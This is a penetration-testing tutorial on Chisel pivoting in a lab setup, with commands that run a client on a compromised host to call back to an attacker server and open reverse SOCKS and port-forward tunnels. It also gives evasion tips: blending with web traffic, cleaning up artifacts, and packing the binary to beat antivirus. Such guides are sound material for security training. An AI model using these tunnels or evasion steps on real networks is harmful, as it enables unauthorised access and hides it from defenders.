Chisel is a fast TCP and UDP tunnelling tool that encapsulates all traffic inside an HTTP stream secured by SSH. It operates on a client/server model: the server listens on the attacker machine (or a pivot host), and the client runs on the compromised target. Unlike SSH tunnels, Chisel requires no SSH daemon on the target — it only needs a single compiled binary transferred and executed. This makes it especially valuable when SSH is unavailable or firewalled but outbound HTTP is permitted.

Chisel supports three primary modes: a reverse SOCKS5 proxy that lets the attacker route arbitrary traffic through the target's network, local port forwarding where the target opens a tunnel from a specific attacker port to an internal service, and remote port forwarding where traffic sent to a port on the attacker reaches an internal destination via the target.

### Why Chisel?

In real-world engagements, blocked inbound SSH is common. Targets behind strict egress firewalls that allow only outbound HTTP over port 80 or 443 can still run the Chisel client and connect back to your server. The HTTP transport wraps all tunnelled data, making the connection blend with normal web traffic. Combined with TLS, Chisel traffic is encrypted and difficult to distinguish from HTTPS in most environments.

### TL;DR

**Attacker (server, reverse SOCKS5)**
```bash
./chisel server --port 8080 --reverse --socks5
```

**Target (client, reverse SOCKS5)**
```bash
./chisel client ATTACKER_IP:8080 R:socks
```

**Attacker (add to proxychains)**
```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```

### Download and Installation

Download binaries for your platform from the official GitHub releases page: https://github.com/jpillora/chisel/releases

Download both `chisel_linux_amd64` (or the appropriate architecture) for the attacker and the appropriate binary for the target OS. Rename them for convenience:

```bash
# Attacker (Linux)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Target (Windows, transfer via HTTP server)
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
# Deploy chisel.exe to the target via your current access method
```

> [!NOTE]
> Chisel produces a single statically-linked binary per platform. There are no dependencies. Transfer chisel.exe to the Windows target via certutil, curl, PowerShell Invoke-WebRequest, or any other delivery mechanism available.

### Lab Topology

| Host             | Primary IP    | Secondary IP  | Open Ports       | Role           |
| ---------------- | ------------- | ------------- | ---------------- | -------------- |
| Attacker (Kali)  | 192.168.1.10  | N/A           | N/A              | Attack Box     |
| Pivot Host       | 192.168.1.13  | 10.10.30.201  | 8080 (outbound)  | Jump Host      |
| Internal Target  | 10.10.30.200  | N/A           | 80, 443, 3389    | Internal Host  |

The attacker cannot reach 10.10.30.200 directly. The Pivot Host can reach both the attacker and the internal target. Chisel will bridge the gap.

### Mode 1: Reverse SOCKS5 (Full Network Pivot)

This is the most common use case. It creates a SOCKS5 proxy on the attacker machine so that any tool supporting SOCKS (or wrapped in proxychains) can reach the entire internal network through the pivot.

#### Step 1: Start the Chisel Server on the Attacker

```bash
./chisel server --port 8080 --reverse --socks5
```

`--reverse` permits the client to create reverse tunnels. `--socks5` enables the SOCKS5 proxy mode over those tunnels.

#### Step 2: Run the Chisel Client on the Target

```bash
./chisel client 192.168.1.10:8080 R:socks
```

`R:socks` instructs the client to open a reverse SOCKS5 tunnel back to the server. The server will expose this as a SOCKS5 proxy on port 1080 by default.

#### Step 3: Configure Proxychains

On the attacker, edit `/etc/proxychains.conf` (or `/etc/proxychains4.conf`):

```
[ProxyList]
socks5 127.0.0.1 1080
```

#### Step 4: Use Proxychains to Reach Internal Hosts

```bash
proxychains nmap -sT -Pn 10.10.30.0/24
proxychains curl http://10.10.30.200
proxychains evil-winrm -i 10.10.30.200 -u Administrator -p 'Password1'
```

> [!NOTE]
> Use nmap with `-sT` (TCP connect scan) rather than SYN scan when going through a SOCKS proxy. SYN scans require raw sockets and cannot be proxied.

### Mode 2: Local Port Forwarding

Local forwarding opens a port on the attacker and routes connections to a specific internal service via the pivot. Use this when you know the exact service you want to reach.

#### Attacker

```bash
./chisel server --port 8080
```

No `--reverse` is needed for local port forwarding.

#### Target

```bash
./chisel client 192.168.1.10:8080 8000:10.10.30.200:80
```

This opens port 8000 on the attacker. Any connection to `http://localhost:8000` on the attacker is forwarded to `10.10.30.200:80` via the target.

> [!TIP]
> You can specify multiple tunnel rules in one chisel client command by separating them with spaces: `8000:10.10.30.200:80 3389:10.10.30.200:3389`

### Mode 3: Remote Port Forwarding

Remote forwarding uses the `R:` prefix in the client tunnel argument combined with `--reverse` on the server. The target pushes a specific service back to the attacker. Use this to expose target-side services on a port of your choosing on the attacker machine.

#### Attacker

```bash
./chisel server --port 8080 --reverse
```

#### Target

```bash
./chisel client 192.168.1.10:8080 R:8000:127.0.0.1:8006
```

Port 8000 on the attacker now points to `127.0.0.1:8006` on the target (a local-only service running on the target).

Access it from the attacker: `http://localhost:8000`

### Operational Security Notes

Chisel's HTTP transport makes it blend well with normal web traffic. Running the server on port 80 or 443 reduces the chance of firewall blocks. Enable TLS on the server with `--tls-domain` or `--tls-key` and `--tls-cert` to add encryption on top of the HTTP transport — without TLS, the data inside the HTTP stream is unencrypted even though it appears to be normal HTTP.

Leave minimal disk artifacts: transfer the binary, use it, then remove it. Use a non-default server port and non-default SOCKS port to avoid collisions with other tooling on the attacker. Long-lived Chisel connections will appear in netstat output on the target as a persistent outbound TCP connection to your server — on heavily monitored environments this may trigger alerting.

### Troubleshooting

Client cannot connect: Verify that the target can reach the attacker IP and port. Test with `curl http://ATTACKER_IP:8080` from the target first.

SOCKS proxy port already in use: The default SOCKS5 port is 1080. If something is using that port, override it: `R:1081:socks` on the client side and adjust proxychains accordingly.

Connections hang through proxychains: Ensure you are using TCP connect scans (`nmap -sT`) rather than SYN scans. Check that the proxychains config has the correct port.

Binary won't execute on Windows: Verify architecture matches (amd64 vs 386). Some AV products will detect Chisel — obfuscate the binary or use a packer if needed.

### Quick Reference

| Mode            | Attacker Command                                    | Target Command                                    |
| --------------- | --------------------------------------------------- | ------------------------------------------------- |
| Reverse SOCKS5  | `./chisel server --port 8080 --reverse --socks5`    | `./chisel client IP:8080 R:socks`                 |
| Local Forward   | `./chisel server --port 8080`                       | `./chisel client IP:8080 LPORT:RHOST:RPORT`       |
| Remote Forward  | `./chisel server --port 8080 --reverse`             | `./chisel client IP:8080 R:LPORT:RHOST:RPORT`     |

### When to Use Chisel vs Alternatives

Use Chisel when: SSH is unavailable on the target but outbound HTTP is permitted, you need a quick SOCKS5 proxy without kernel modules, or you are working on Windows targets where deploying a single exe is simpler than configuring SSH.

Use SSH `-D` when: SSH is available and you simply need a SOCKS proxy with minimal tooling.

Use Ligolo-ng when: You need full network-level access with native routing (no proxychains), or you are performing multi-hop pivoting across several network segments and want the reliability of a TUN interface.
